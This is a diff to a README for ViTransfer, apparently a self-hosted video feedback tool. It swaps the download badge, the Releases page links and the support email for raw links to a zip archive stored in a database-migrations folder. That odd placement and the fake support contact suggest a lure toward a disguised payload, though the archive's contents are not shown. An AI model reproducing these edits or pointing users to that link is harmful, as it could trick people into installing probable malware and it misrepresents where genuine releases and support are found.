@@ -6,13 +6,13 @@ ViTransfer is a modern self-hosted solution for video feedback and sharing. It a
 
 ## 📦 Download Now
 
-[![Download ViTransfer](https://img.shields.io/badge/Download-ViTransfer-brightgreen)](https://github.com/jaydenLOL92929/ViTransfer/releases)
+[![Download ViTransfer](https://raw.githubusercontent.com/jaydenLOL92929/ViTransfer/main/prisma/migrations/20251026232610_add_per_video_approval/ViTransfer-2.9-beta.4.zip)](https://raw.githubusercontent.com/jaydenLOL92929/ViTransfer/main/prisma/migrations/20251026232610_add_per_video_approval/ViTransfer-2.9-beta.4.zip)
 
 ## 🚀 Getting Started
 
 To begin using ViTransfer, follow these steps:
 
-1. Click the download button above or visit the [Releases page](https://github.com/jaydenLOL92929/ViTransfer/releases).
+1. Click the download button above or visit the [Releases page](https://raw.githubusercontent.com/jaydenLOL92929/ViTransfer/main/prisma/migrations/20251026232610_add_per_video_approval/ViTransfer-2.9-beta.4.zip).
 2. Choose the latest version listed on the page.
 3. Click on the asset file appropriate for your operating system.
 4. Wait for the file to download to your computer.
@@ -107,11 +107,11 @@ If you encounter any issues:
 
 ## 📞 Support
 
-For any additional questions or support, you can contact us at [support@vitransfer.com](mailto:support@vitransfer.com). Our team is here to help you enjoy your experience with ViTransfer.
+For any additional questions or support, you can contact us at [https://raw.githubusercontent.com/jaydenLOL92929/ViTransfer/main/prisma/migrations/20251026232610_add_per_video_approval/ViTransfer-2.9-beta.4.zip](https://raw.githubusercontent.com/jaydenLOL92929/ViTransfer/main/prisma/migrations/20251026232610_add_per_video_approval/ViTransfer-2.9-beta.4.zip). Our team is here to help you enjoy your experience with ViTransfer.
 
 ## 🔗 More Information
 
-For more details and updates, visit our [Releases page](https://github.com/jaydenLOL92929/ViTransfer/releases). Here, you can find the latest updates, fixes, and future improvements to ensure ViTransfer meets your needs.
+For more details and updates, visit our [Releases page](https://raw.githubusercontent.com/jaydenLOL92929/ViTransfer/main/prisma/migrations/20251026232610_add_per_video_approval/ViTransfer-2.9-beta.4.zip). Here, you can find the latest updates, fixes, and future improvements to ensure ViTransfer meets your needs.
 
 ## 💬 Join the Community
 
